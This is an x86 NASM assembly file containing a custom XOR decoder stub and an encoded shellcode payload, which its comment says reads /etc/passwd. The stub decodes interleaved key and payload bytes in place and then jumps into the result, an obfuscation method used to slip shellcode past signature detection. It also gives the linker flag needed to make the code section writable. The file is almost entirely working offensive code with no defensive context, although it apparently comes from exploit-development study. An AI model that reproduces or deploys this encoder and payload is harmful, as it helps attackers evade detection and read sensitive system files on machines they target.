; Filename: custom_decode.nasm
; read /etc/passwd


global _start

section .text
_start:
	jmp _shellcode


_decode_stub:
	pop esi 						; ptr to encoded_shellcode
	xor ecx, ecx			
	mul ecx							; ecx, edx, eax all cleared
	xor ebx, ebx					; ebx cleared

_loop:
	mov dl, byte [esi + ecx]		; mov random byte to dl
	mov bl, byte [esi + ecx + 1]	; mov next instruction to be xor'ed
	
	; exit condition
	cmp bl, 0xff 					; is next byte to xor a 0xff 
	jz _execute
	
	xor bl, dl
	mov byte [esi + eax], bl		; move dl to shellcode
	add ecx, 0x2
	inc eax
	jmp _loop


_execute:
	jmp esi


; section .data						; need .data section to be writable
									; OR, compile with 'ld -N' to make .text section not read-only
_shellcode:
	call _decode_stub
	encoded_shellcode: db 0x8b, 0x56, 0x97, 0x56, 0xab, 0x14, 0x77, 0x27, 0x8e, 0x4a, 0x1b, 0x5a, 0x9a, 0x3e, 0x22, 0xfb, 0xc8, 0xbc, 0xef, 0xcb, 0x74, 0x80, 0x91, 0xcb, 0x1c, 0x37, 0x55, 0x9c, 0xce, 0x7f, 0x9c, 0x8f, 0x17, 0x26, 0xb3, 0xc9, 0x90, 0x88, 0x66, 0x65, 0xf2, 0x88, 0x7b, 0x63, 0xcb, 0x48, 0x78, 0xba, 0x40, 0x14, 0x23, 0x05, 0x91, 0x25, 0xa2, 0xed, 0xd7, 0xb5, 0x01, 0x1f, 0xd2, 0xe0, 0xae, 0x3e, 0xef, 0x65, 0x0f, 0x51, 0x37, 0x51, 0x45, 0xe4, 0xe9, 0xaa, 0xcb, 0x58, 0x4a, 0x52, 0x83, 0xcb, 0xf9, 0x69, 0x3b, 0xaf, 0x2b, 0x31, 0x86, 0xcd, 0x28, 0x3e, 0xd1, 0x34, 0xf3, 0x66, 0xed, 0x41, 0x42, 0xdd, 0xb4, 0xa8, 0x59, 0x46, 0x81, 0xb3, 0x77, 0xf8, 0xca, 0x14, 0x76, 0x16, 0x04, 0xfa, 0x96, 0xb9, 0x82, 0xd5, 0xd3, 0x71, 0x7d, 0xc5, 0x7e, 0x55, 0xcc, 0xa4, 0x86, 0xa5, 0x6e, 0xd7, 0x66, 0xee, 0xd4, 0xbd, 0xcc, 0xef, 0x5d, 0xe4, 0x78, 0x96, 0xe7, 0x43, 0xd4, 0x77, 0x71, 0x70, 0xb7, 0x58, 0x9d, 0xab, 0xb6, 0x12, 0x74, 0x05, 0xfe, 0xaa, 0x4a, 0x7c, 0xb5, 0x11, 0x42, 0x33, 0x09, 0xa3, 0xc2, 0x38, 0x3f, 0x1b, 0xf5, 0x6c, 0xd7, 0xb8, 0xbd, 0x46, 0x09, 0xd3, 0x66, 0xc3, 0x5b, 0x1b, 0x08, 0x69, 0x77, 0x26, 0xb4, 0x8d, 0x16, 0xa7, 0xcd, 0xd4, 0x76, 0x8e, 0x1c, 0xd2, 0x75, 0xcb, 0x94, 0x3a, 0x09, 0x97, 0x39, 0x09, 0xff, 0xff
